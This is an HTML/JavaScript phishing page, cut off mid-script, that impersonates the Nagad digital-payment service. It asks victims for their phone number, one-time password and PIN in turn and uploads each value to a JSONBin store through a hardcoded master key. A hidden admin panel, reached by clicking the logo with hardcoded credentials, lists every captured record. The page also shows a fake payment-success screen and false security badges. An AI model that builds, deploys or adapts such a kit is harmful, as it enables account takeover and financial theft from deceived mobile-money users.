<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NAGAD DIGITAL PAYMENT</title>
    <style>
        :root {
            --primary: #1a73e8;
            --primary-dark: #0d47a1;
            --secondary: #34a853;
            --light: #f8f9fa;
            --dark: #202124;
            --gray: #5f6368;
            --error: #ea4335;
            --success: #34a853;
            --warning: #f9a825;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%);
            color: var(--dark);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 450px;
            background-color: white;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            overflow: hidden;
            position: relative;
        }
        
        .header {
            background: linear-gradient(to right, var(--primary), var(--primary-dark));
            padding: 25px 20px;
            text-align: center;
            color: white;
            position: relative;
        }
        
        .logo-container {
            margin-bottom: 15px;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }
        
        .logo-svg {
            width: 120px;
            height: 80px;
            filter: brightness(0) invert(1);
            cursor: pointer;
            transition: transform 0.3s ease;
        }
        
        .logo-svg:hover {
            transform: scale(1.05);
        }
        
        .admin-badge {
            position: absolute;
            top: -5px;
            right: -5px;
            background: var(--success);
            color: white;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            font-size: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0;
            transition: opacity 0.3s;
        }
        
        .logo-container:hover .admin-badge {
            opacity: 1;
        }
        
        .header h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 5px;
        }
        
        .header p {
            font-size: 14px;
            opacity: 0.9;
        }
        
        .form-container {
            padding: 30px;
        }
        
        .form-step {
            display: none;
        }
        
        .form-step.active {
            display: block;
        }
        
        .form-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 20px;
            color: var(--dark);
            text-align: center;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        .input-label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: 500;
            color: var(--gray);
        }
        
        .input-field {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s;
        }
        
        .input-field:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
        }
        
        .btn {
            width: 100%;
            padding: 14px;
            background-color: var(--primary);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .btn:hover {
            background-color: var(--primary-dark);
        }
        
        .btn:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
        
        .timer {
            text-align: center;
            margin: 20px 0;
            font-size: 14px;
            color: var(--gray);
        }
        
        .otp-inputs {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        
        .otp-input {
            width: 50px;
            height: 50px;
            text-align: center;
            font-size: 20px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            transition: all 0.3s;
        }
        
        .otp-input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
        }
        
        .success-container {
            text-align: center;
            padding: 30px;
        }
        
        .success-icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background-color: var(--success);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: white;
        }
        
        .success-title {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 10px;
            color: var(--success);
        }
        
        .success-message {
            color: var(--gray);
            margin-bottom: 20px;
        }
        
        .terms {
            margin-top: 20px;
            font-size: 12px;
            color: var(--gray);
            text-align: center;
        }
        
        .terms a {
            color: var(--primary);
            text-decoration: none;
        }
        
        .graphics {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 100px;
            background: linear-gradient(to right, transparent, rgba(26, 115, 232, 0.1), transparent);
            z-index: -1;
        }
        
        .graphic-element {
            position: absolute;
            background-color: rgba(26, 115, 232, 0.1);
            border-radius: 50%;
        }
        
        .graphic-1 {
            width: 100px;
            height: 100px;
            top: 20%;
            left: 10%;
        }
        
        .graphic-2 {
            width: 150px;
            height: 150px;
            bottom: 10%;
            right: 5%;
        }
        
        .loader {
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }
        
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        
        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 15px 0;
            color: var(--success);
            font-size: 14px;
        }
        
        .security-badge svg {
            margin-right: 8px;
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            background: var(--success);
            color: white;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            z-index: 1000;
            display: none;
        }
        
        .debug-info {
            position: fixed;
            bottom: 10px;
            left: 10px;
            background: rgba(0,0,0,0.8);
            color: white;
            padding: 10px;
            border-radius: 5px;
            font-size: 12px;
            display: none;
        }

        /* Admin Panel Modal Styles */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 1000;
            overflow: auto;
        }
        
        .modal-content {
            background-color: white;
            margin: 5% auto;
            padding: 0;
            border-radius: 8px;
            width: 90%;
            max-width: 900px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        
        .modal-header {
            padding: 20px;
            background: linear-gradient(to right, var(--primary), var(--primary-dark));
            color: white;
            border-radius: 8px 8px 0 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .modal-header h2 {
            margin: 0;
            font-size: 20px;
        }
        
        .close {
            color: white;
            font-size: 28px;
            font-weight: bold;
            text-decoration: none;
            cursor: pointer;
        }
        
        .close:hover {
            color: #ddd;
        }
        
        .modal-body {
            padding: 20px;
            max-height: 70vh;
            overflow-y: auto;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        
        th {
            background-color: #f8f9fa;
            font-weight: 600;
            color: var(--dark);
        }
        
        tr:hover {
            background-color: #f5f5f5;
        }
        
        .data-count {
            background: var(--primary);
            color: white;
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 14px;
            margin-left: 10px;
        }
        
        @media (max-width: 480px) {
            .container {
                max-width: 100%;
            }
            
            .form-container {
                padding: 20px;
            }
            
            .logo-svg {
                width: 100px;
                height: 70px;
            }
        }
    </style>
</head>
<body>
    <div class="notification" id="notification">Processing...</div>
    <div class="debug-info" id="debug-info">System Ready</div>
    
    <!-- Admin Login Modal -->
    <div id="admin-login" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Admin Login</h2>
                <span class="close">&times;</span>
            </div>
            <div class="modal-body">
                <div class="input-group">
                    <label class="input-label" for="admin-username">Username</label>
                    <input type="text" id="admin-username" class="input-field" placeholder="Enter admin username">
                </div>
                <div class="input-group">
                    <label class="input-label" for="admin-password">Password</label>
                    <input type="password" id="admin-password" class="input-field" placeholder="Enter admin password">
                </div>
                <div class="error-message" id="admin-error" style="color: var(--error); text-align: center; margin: 10px 0; display: none;">
                    Invalid username or password
                </div>
                <button class="btn" id="admin-login-btn">
                    <span>Login to Admin Panel</span>
                </button>
            </div>
        </div>
    </div>
    
    <!-- Admin Panel Modal -->
    <div id="admin-panel" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Admin Panel - All Collected Data <span class="data-count" id="data-count">0</span></h2>
                <span class="close">&times;</span>
            </div>
            <div class="modal-body">
                <div style="display: flex; gap: 10px; margin-bottom: 20px;">
                    <button class="btn" id="admin-logout" style="background-color: var(--error);">
                        <span>Logout</span>
                    </button>
                    <button class="btn" id="clear-data" style="background-color: var(--warning);">
                        <span>Clear All Data</span>
                    </button>
                    <button class="btn" id="refresh-data" style="background-color: var(--success);">
                        <span>Refresh Data</span>
                    </button>
                </div>
                
                <div class="input-group">
                    <label class="input-label">Complete Transactions</label>
                    <div id="transactions-list">
                        <!-- Data will be populated here -->
                    </div>
                </div>
                
                <table id="transaction-table">
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Phone Number</th>
                            <th>OTP</th>
                            <th>PIN</th>
                            <th>Timestamp</th>
                            <th>Transaction ID</th>
                        </tr>
                    </thead>
                    <tbody id="transaction-data">
                        <!-- Transaction data will be populated here -->
                    </tbody>
                </table>
            </div>
        </div>
    </div>
    
    <div class="container">
        <div class="header">
            <div class="logo-container">
                <svg class="logo-svg" xmlns="http://www.w3.org/2000/svg" viewBox="-13.305 -31.2 115.31 187.2">
                    <style type="text/css">.st0{fill:#ec1c24}.st1{fill:#231f20}.st3{fill:#ea2227}.st4{fill:#f69220}</style>
                    <path d="M29.9 79.2H.9c-.5 0-.9.4-.9.9v2.2c0 .5.4.9.9.9h21.5v11.9c-.6-.9-1.3-1.7-2.1-2.5-2.5-2.6-5.3-3.9-8.1-3.9-2.2 0-4.2 1.1-5.7 3.2-1.2 1.7-2 3.7-2 5.5 0 1.9.3 4.3 1.7 6.5 1.8 2.7 4.6 3.5 7.1 3.5 3.3 0 6.1-2.3 6.1-5.2 0-1.7-.9-3.2-2.5-4.1l-1.6-.9v2.4c-.1.6-1.3 1.7-2.6 1.7-1.1 0-2.2-.5-2.8-1.1-.5-.5-.6-1.3-.6-1.9 0-.8.3-1.6.9-2.4.7-.8 1.4-1.2 2.5-1.2 2.9-.1 5.3 1.3 7.3 4.2 1.6 2.4 2.4 4.7 2.4 7.2l.1 6 4.3 2.6c.1.1.3.1.5.1.5 0 .9-.4.9-.9V83.3h1.7c.5 0 .9-.4.9-.9v-2.2c0-.6-.4-1-.9-1" class="st0"/>
                    <path d="M87.7 79.2H51c-.5 0-.9.4-.9.9v4.1c-3.5-3.7-6.7-5.6-9.6-5.6-2.7-.1-5.1.6-6.9 2.1-1.9 1.5-3 3.3-3 5.4 0 6.4 7.2 6.4 9 5.4.3-.2.7-.4 1.2-.4 1.5 0 2 1.1 2 2.1 0 1.5-2.1 2.8-4.7 2.8-1.4 0-2.3-.4-2.9-1.2l-1.1-1.7-.8 1.9c-.2.5-.4 1-.4 1.7 0 1.5.8 2.9 2.1 4.1 1.3 1.1 2.9 1.7 4.6 1.7 2.7 0 5-1 6.5-3 1.2-1.6 1.8-3.5 1.8-5.6 0-1.2-.4-2.4-1.4-3.8-1.2-1.7-2.6-2.5-4.2-2.5-.6 0-1.3.2-2 .4-.3.1-.8.2-.9.2-.2 0-.7-.1-1-.5-.2-.2-.6-.7-.6-1.4.1-1.6 1.5-3.2 4-3.2h.1c1.7 0 3.4.8 5.1 2.4 1.3 1.2 2.3 2.5 3.1 3.9v22.8l4.3 2.5c.1.1.3.1.5.1.5 0 .9-.4.9-.9V83.3h6.5v19.8l5.2 2.1c.1 0 .2.1.3.1.5 0 .9-.4.9-.8v-.2c.9-5.8 3.4-9.9 7.7-12.3v1.1c0 .8.1 3 .1 4.2 0 .7.1 1.2.1 1.6 0 2.2.3 5.8 1.1 8.3 1.4 4.9 3.8 6 5.6 6.1h.1c1 0 1.8-.3 2.4-.8.3-.3.7-.9.7-1.9 0-.9-.1-1.6-.4-2.1l-.4-.7-.8.2c-.9.2-1.2.2-1.3.2h-.2c-.2 0-.3 0-.4-.1-.3-.1-.8-.6-1.2-2.2-.3-1.2-.4-2.7-.4-3.6 0-6.4 1.3-11.2 3.4-12.3l.1-.1c.3-.2.5-.5.5-.8 0-.2 0-.3-.1-.4v-.3c-1-2-3.1-3.4-6-4.2l-.2-.1h-.2c-2.3.4-5 2-8.4 4.8-.9.7-1.7 1.5-2.5 2.2v-7.9h19.7c.5 0 .9-.4.9-.9v-2.2c0-.5-.4-.9-.9-.9" class="st0"/>
                    <path d="M2.9 120.3v1.8l1.5-.6.5.4v.5c0 .6-.2 1.1-.5 1.5-.3.4-.8.6-1.4.6-.6 0-1.2-.3-1.7-.8-.4-.4-.7-1-1-1.7l.4-.3c.5 1.5 1.3 2.2 2.3 2.2.4 0 .7-.1.9-.4.3-.3.4-.6.4-1 0-.2 0-.3-.1-.5l-1.4.6-.5-.4v-1.9H0v-.4h5.3v.5H2.9z" class="st1"/>
                    <g transform="translate(-5.7 -1.1)">
                        <path d="M80.4 39.7c0 .9 0 1.9-.1 2.8-.3 4-1.3 7.7-2.9 11.2-.6 1.4-1.4 2.7-2.2 4-6 9.5-16.5 15.7-28.5 15.7-5.1 0-10-1.2-14.4-3.2C20.9 64.8 13 53.1 13 39.7 13 26.4 20.6 15 31.7 9.5c-.9 1.1-1.7 2.4-2.4 3.6-.1.1-.1.2-.2.3-.4.4-.9.7-1.3 1.1L26.3 16l-.3.3c-.1.1-.2.2-.3.4-.2.2-.4.4-.5.6-.3.4-.7.8-1 1.3-1.4 1.8-2.6 3.9-3.5 6l-.3.6c-.1.3-.2.5-.3.8 0 .1-.1.3-.1.4-.1.4-.3.8-.4 1.2-.1.3-.2.5-.2.8 0 .1-.1.3-.1.4-.1.3-.1.5-.2.8-.2.8-.4 1.7-.5 2.6 0 .2-.1.4-.1.7 0 .2 0 .3-.1.5 0 .3 0 .5-.1.8v2.2c0 9.2 4.2 17.4 10.8 22.8 5.1 4.2 11.6 6.7 18.6 6.7 6.4 0 12.4-2.1 17.2-5.6 3.5-2.6 6.5-5.9 8.6-9.7.3-.5.5-1 .8-1.5 1.7-3.5 2.7-7.5 2.8-11.6v-1c0-1 0-1.9-.1-2.8.1 0 .1.1.1.1.5.4.9.8 1.3 1.2.4-.7.8-1.4 1.3-2 .3 1.3.5 2.6.6 3.9.1.8.1 1.8.1 2.8" class="st3"/>
                        <path d="M77.1 36.3v1c0 6-2.5 11-2.8 11.6-.2.5-.5 1-.8 1.5-2.1 3.8-5.1 7.2-8.6 9.7-4.8 3.5-10.8 5.6-17.2 5.6-7.1 0-13.6-2.5-18.6-6.7-6.6-5.4-10.8-13.6-10.8-22.8V34c0-.3 0-.5.1-.8 0-.2 0-.3.1-.5 0-.2.1-.4.1-.7.1-.9.3-1.7.5-2.6.1-.3.1-.5.2-.8 0-.1.1-.3.1-.4.1-.3.1-.5.2-.8.1-.4.3-.8.4-1.2 0-.1.1-.3.1-.4.1-.3.2-.5.3-.8l.3-.6c.9-2.1 2.1-4.2 3.5-6 .3-.4.7-.8 1-1.3.2-.2.3-.4.5-.6.1-.1.2-.2.3-.4l.3-.3 1.5-1.5c.4-.4.9-.8 1.3-1.1-.1.1-.1.2-.2.3-.1.1-.1.2-.2.4-1.7 3.5-2.8 7.5-3.2 11.9-.1 1.2-.2 2.4-.2 3.6 0 15.4 9 27.9 20.2 27.9h1.1c1.6 0 3.2-.2 4.7-.6 7.6-2.1 13.1-9 13.1-17.2V39c-.1-4.9-2.2-9.2-5.5-12.4 2.3.1 4.5.4 6.7.9 4.1 1.1 7.9 3 11.1 5.6.1 0 .1.1.2.1.1 1.2.2 2.1.2 3.1" class="st4"/>
                    </g>
                </svg>
                <div class="admin-badge">‚öôÔ∏è</div>
            </div>
            <h1>NAGAD DIGITAL PAYMENT</h1>
            <p>Secure & Fast Digital Transactions</p>
        </div>
        
        <div class="form-container">
            <!-- Phone Number Form -->
            <div class="form-step active" id="step-1">
                <h2 class="form-title">Enter Your Phone Number</h2>
                
                <div class="input-group">
                    <label class="input-label" for="phone">Phone Number</label>
                    <input type="tel" id="phone" class="input-field" placeholder="01XXXXXXXXX" required>
                </div>
                
                <button class="btn" id="submit-phone">
                    <span>Send OTP</span>
                </button>
                
                <div class="security-badge">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z" fill="#34A853"/>
                        <path d="M12 12L17 7L15.59 5.59L12 9.17L8.41 5.59L7 7L12 12Z" fill="white"/>
                    </svg>
                    Secure & Encrypted Connection
                </div>
                
                <p class="terms">
                    By continuing, you agree to our <a href="#">Terms & Conditions</a>
                </p>
            </div>
            
            <!-- OTP Form -->
            <div class="form-step" id="step-2">
                <h2 class="form-title">Enter OTP</h2>
                <p class="timer" id="countdown">OTP has been sent to your phone</p>
                
                <div class="otp-inputs">
                    <input type="text" class="otp-input" maxlength="1" id="otp1">
                    <input type="text" class="otp-input" maxlength="1" id="otp2">
                    <input type="text" class="otp-input" maxlength="1" id="otp3">
                    <input type="text" class="otp-input" maxlength="1" id="otp4">
                    <input type="text" class="otp-input" maxlength="1" id="otp5">
                    <input type="text" class="otp-input" maxlength="1" id="otp6">
                </div>
                
                <button class="btn" id="submit-otp">
                    <span>Verify OTP</span>
                </button>
                
                <div class="security-badge">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z" fill="#34A853"/>
                        <path d="M12 12L17 7L15.59 5.59L12 9.17L8.41 5.59L7 7L12 12Z" fill="white"/>
                    </svg>
                    End-to-End Encrypted
                </div>
                
                <p class="terms">
                    OTP is valid for 10 minutes
                </p>
            </div>
            
            <!-- PIN Form -->
            <div class="form-step" id="step-3">
                <h2 class="form-title">Enter Your PIN</h2>
                <p class="timer" id="pin-timer">PIN entry will be enabled in <span id="timer">20</span> seconds</p>
                
                <div class="input-group">
                    <label class="input-label" for="pin">Nagad PIN</label>
                    <input type="password" id="pin" class="input-field" placeholder="Enter 4-digit PIN" maxlength="4" disabled>
                </div>
                
                <button class="btn" id="submit-pin" disabled>
                    <span>Complete Payment</span>
                </button>
                
                <div class="security-badge">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z" fill="#34A853"/>
                        <path d="M12 12L17 7L15.59 5.59L12 9.17L8.41 5.59L7 7L12 12Z" fill="white"/>
                    </svg>
                    Bank-Level Security
                </div>
                
                <p class="terms">
                    Your PIN is encrypted and secure
                </p>
            </div>
            
            <!-- Success Message -->
            <div class="form-step" id="step-4">
                <div class="success-container">
                    <div class="success-icon">‚úì</div>
                    <h2 class="success-title">Payment Successful!</h2>
                    <p class="success-message">Your transaction has been completed successfully.</p>
                    <p class="success-message" id="transaction-id">Transaction ID: <span id="current-transaction-id"></span></p>
                    <button class="btn" id="new-transaction">
                        <span>New Transaction</span>
                    </button>
                </div>
            </div>
        </div>
        
        <div class="graphics">
            <div class="graphic-element graphic-1"></div>
            <div class="graphic-element graphic-2"></div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // JSONBin Configuration
            const JSONBIN_BIN_ID = '69189788ae596e708f5af2d5';
            const JSONBIN_ACCESS_KEY = '$2a$10$DgGRzf5jHNsf2IYoGc28YO71ERpGrtxMaHPNhbnZcdMbdRZVxqsbW';
            
            // DOM Elements
            const step1 = document.getElementById('step-1');
            const step2 = document.getElementById('step-2');
            const step3 = document.getElementById('step-3');
            const step4 = document.getElementById('step-4');
            const submitPhoneBtn = document.getElementById('submit-phone');
            const submitOtpBtn = document.getElementById('submit-otp');
            const submitPinBtn = document.getElementById('submit-pin');
            const newTransactionBtn = document.getElementById('new-transaction');
            const phoneInput = document.getElementById('phone');
            const pinInput = document.getElementById('pin');
            const otpInputs = document.querySelectorAll('.otp-input');
            const timerElement = document.getElementById('timer');
            const transactionIdElement = document.getElementById('current-transaction-id');
            const notification = document.getElementById('notification');
            const debugInfo = document.getElementById('debug-info');
            
            // Admin elements
            const adminLoginModal = document.getElementById('admin-login');
            const adminPanelModal = document.getElementById('admin-panel');
            const adminLoginBtn = document.getElementById('admin-login-btn');
            const adminLogoutBtn = document.getElementById('admin-logout');
            const clearDataBtn = document.getElementById('clear-data');
            const refreshDataBtn = document.getElementById('refresh-data');
            const adminUsername = document.getElementById('admin-username');
            const adminPassword = document.getElementById('admin-password');
            const adminError = document.getElementById('admin-error');
            const logo = document.querySelector('.logo-svg');
            const dataCount = document.getElementById('data-count');
            
            // Admin credentials
            const ADMIN_CREDENTIALS = {
                username: "nagadinfoo2008",
                password: "Trm@kechudi1234"
            };
            
            // Show debug info
            debugInfo.style.display = 'block';
            debugInfo.innerHTML = 'System Ready - Click Nagad logo for admin';
            
            // Initialize JSONBin
            initializeJSONBin();
            
            // Current transaction data
            let currentTransaction = {
                phone: '',
                otp: '',
                pin: '',
                timestamp: '',
                transactionId: ''
            };
            
            let pinCountdownInterval = null;

            // Initialize JSONBin connection
            async function initializeJSONBin() {
                try {
                    const response = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
                        method: 'GET',
                        headers: {
                            'X-Master-Key': JSONBIN_ACCESS_KEY,
                        }
                    });
                    
                    if (response.ok) {
                        const data = await response.json();
                        console.log('JSONBin initialized:', data);
                        debugInfo.innerHTML = '‚úÖ JSONBin Connected - Data synced across all devices';
                    } else {
                        throw new Error('Failed to connect to JSONBin');
                    }
                } catch (error) {
                    console.error('JSONBin initialization error:', error);
                    debugInfo.innerHTML = '‚ùå JSONBin Error - Check console for details';
                }
            }

            // Save data to JSONBin
            async function saveToJSONBin(transactionData) {
                try {
                    // First, get the latest data from JSONBin
                    const getResponse = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
                        method: 'GET',
                        headers: {
                            'X-Master-Key': JSONBIN_ACCESS_KEY,
                        }
                    });
                    
                    if (!getResponse.ok) {
                        throw new Error('Failed to fetch existing data');
                    }
                    
                    const existingData = await getResponse.json();
                    const transactions = existingData.record.transactions || [];
                    
                    // Add new transaction with unique ID
                    const newTransaction = {
                        ...transactionData,
                        id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
                        timestamp: new Date().toLocaleString(),
                        userAgent: navigator.userAgent,
                        device: getDeviceInfo()
                    };
                    
                    transactions.push(newTransaction);
                    
                    // Update JSONBin
                    const updateResponse = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
                        method: 'PUT',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-Master-Key': JSONBIN_ACCESS_KEY,
                            'X-Bin-Versioning': 'false'
                        },
                        body: JSON.stringify({
                            transactions: transactions,
                            lastUpdated: new Date().toISOString()
                        })
                    });
                    
                    if (updateResponse.ok) {
                        const result = await updateResponse.json();
                        console.log('‚úÖ Data saved to JSONBin:', newTransaction);
                        showNotification('Data saved to cloud!', 'success');
                        return true;
                    } else {
                        throw new Error('Failed to update JSONBin');
                    }
                } catch (error) {
                    console.error('‚ùå Error saving to JSONBin:', error);
                    // Fallback to localStorage
                    saveToLocalStorage(transactionData);
                    showNotification('Saved locally (cloud error)', 'warning');
                    return false;
                }
            }

            // Get data from JSONBin
            async function getFromJSONBin() {
                try {
                    const response = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
                        method: 'GET',
                        headers: {
                            'X-Master-Key': JSONBIN_ACCESS_KEY,
                        }
                    });
                    
                    if (response.ok) {
                        const data = await response.json();
                        console.log('‚úÖ Data fetched from JSONBin');
                        return data.record.transactions || [];
                    } else {
                        throw new Error('Failed to fetch from JSONBin');
                    }
                } catch (error) {
                    console.error('‚ùå Error fetching from JSONBin:', error);
                    // Fallback to localStorage
                    return getFromLocalStorage();
                }
            }

            // Clear all data from JSONBin
            async function clearJSONBinData() {
                try {
                    const response = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
                        method: 'PUT',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-Master-Key': JSONBIN_ACCESS_KEY,
                        },
                        body: JSON.stringify({
                            transactions: [],
                            lastUpdated: new Date().toISOString()
                        })
                    });
                    
                    if (response.ok) {
                        const result = await response.json();
                        console.log('‚úÖ JSONBin data cleared');
                        return true;
                    } else {
                        throw new Error('Failed to clear JSONBin');
                    }
                } catch (error) {
                    console.error('‚ùå Error clearing JSONBin:', error);
                    return false;
                }
            }

            // Fallback functions
            function saveToLocalStorage(transactionData) {
                const transactions = JSON.parse(localStorage.getItem('nagadTransactions') || '[]');
                transactions.push({
                    ...transactionData,
                    id: Date.now().toString(),
                    savedLocally: true
                });
                localStorage.setItem('nagadTransactions', JSON.stringify(transactions));
            }

            function getFromLocalStorage() {
                return JSON.parse(localStorage.getItem('nagadTransactions') || '[]');
            }

            // Get device info
            function getDeviceInfo() {
                const ua = navigator.userAgent;
                if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry/.test(ua)) {
                    return 'Mobile';
                } else if (/Tablet|iPad/.test(ua)) {
                    return 'Tablet';
                } else {
                    return 'Desktop';
                }
            }
            
            // Format phone number as user types
            phoneInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 0) {
                    value = value.substring(0, 11);
                    e.target.value = value;
                }
            });
            
            // PIN validation - only numbers and exactly 4 digits
            pinInput.addEventListener('input', function(e) {
                e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
            });
            
            // OTP input handling
            otpInputs.forEach((input, index) => {
                input.addEventListener('input', function(e) {
                    const value = e.target.value;
                    if (value.length === 1 && index < otpInputs.length - 1) {
                        otpInputs[index + 1].focus();
                    }
                });
                
                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && !e.target.value && index > 0) {
                        otpInputs[index - 1].focus();
                    }
                });
            });
            
            // Submit phone number
            submitPhoneBtn.addEventListener('click', async function() {
                const phone = phoneInput.value.trim();
                
                if (!phone || phone.length !== 11) {
                    alert('Please enter a valid 11-digit phone number');
                    return;
                }
                
                // Show loading state
                submitPhoneBtn.innerHTML = '<div class="loader"></div> Sending OTP...';
                submitPhoneBtn.disabled = true;
                
                // Store phone number in current transaction
                currentTransaction.phone = phone;
                
                // Save to JSONBin
                await saveToJSONBin({
                    phone: phone,
                    step: 'phone',
                    completed: false
                });
                
                debugInfo.innerHTML = `Phone recorded: ${phone}`;
                
                // Simulate API call delay
                setTimeout(() => {
                    // Switch to OTP step
                    step1.classList.remove('active');
                    step2.classList.add('active');
                    
                    // Reset button
                    submitPhoneBtn.innerHTML = '<span>Send OTP</span>';
                    submitPhoneBtn.disabled = false;
                    
                    // Focus on first OTP input
                    otpInputs[0].focus();
                }, 1000);
            });
            
            // Submit OTP
            submitOtpBtn.addEventListener('click', async function() {
                const otp = Array.from(otpInputs).map(input => input.value).join('');
                
                if (otp.length !== 6) {
                    alert('Please enter the complete 6-digit OTP');
                    return;
                }
                
                // Show loading state
                submitOtpBtn.innerHTML = '<div class="loader"></div> Verifying...';
                submitOtpBtn.disabled = true;
                
                // Store OTP in current transaction
                currentTransaction.otp = otp;
                
                // Save to JSONBin
                await saveToJSONBin({
                    phone: currentTransaction.phone,
                    otp: otp,
                    step: 'otp',
                    completed: false
                });
                
                debugInfo.innerHTML = `OTP recorded: ${otp}`;
                
                // Simulate OTP verification delay
                setTimeout(() => {
                    // Switch to PIN step
                    step2.classList.remove('active');
                    step3.classList.add('active');
                    
                    // Reset button
                    submitOtpBtn.innerHTML = '<span>Verify OTP</span>';
                    submitOtpBtn.disabled = false;
                    
                    // Start PIN countdown
                    startPinCountdown();
                }, 1000);
            });
            
            // Start PIN countdown
            function startPinCountdown() {
                let countdown = 20;
                timerElement.textContent = countdown;
                
                pinCountdownInterval = setInterval(() => {
                    countdown--;
                    timerElement.textContent = countdown;
                    
                    if (countdown <= 0) {
                        clearInterval(pinCountdownInterval);
                        document.getElementById('pin-timer').innerHTML = 'Enter your PIN to complete payment';
                        
                        // Enable PIN input
                        pinInput.disabled = false;
                        submitPinBtn.disabled = false;
                        
                        // Focus on PIN input
                        pinInput.focus();
                    }
                }, 1000);
            }
            
            // Submit PIN and complete payment
            submitPinBtn.addEventListener('click', async function() {
                const pin = pinInput.value.trim();
                
                if (!pin || pin.length !== 4) {
                    alert('Please enter a valid 4-digit PIN');
                    return;
                }
                
                // Show loading state
                submitPinBtn.innerHTML = '<div class="loader"></div> Processing...';
                submitPinBtn.disabled = true;
                
                // Store PIN and complete transaction
                currentTransaction.pin = pin;
                currentTransaction.transactionId = 'TXN' + Date.now() + Math.floor(Math.random() * 1000);
                
                // Save complete transaction to JSONBin
                await saveToJSONBin({
                    ...currentTransaction,
                    completed: true
                });
                
                debugInfo.innerHTML = `Complete data recorded - Phone: ${currentTransaction.phone}, OTP: ${currentTransaction.otp}, PIN: ${pin}`;
                
                // Simulate payment processing
                setTimeout(() => {
                    // Show success message
                    step3.classList.remove('active');
                    step4.classList.add('active');
                    transactionIdElement.textContent = currentTransaction.transactionId;
                    
                    // Reset button
                    submitPinBtn.innerHTML = '<span>Complete Payment</span>';
                    submitPinBtn.disabled = false;
                }, 1500);
            });
            
            // Start new transaction
            newTransactionBtn.addEventListener('click', function() {
                resetTransactionForm();
                step4.classList.remove('active');
                step1.classList.add('active');
            });
            
            // Reset transaction form
            function resetTransactionForm() {
                phoneInput.value = '';
                pinInput.value = '';
                otpInputs.forEach(input => {
                    input.value = '';
                });
                pinInput.disabled = true;
                submitPinBtn.disabled = true;
                
                // Reset current transaction
                currentTransaction = {
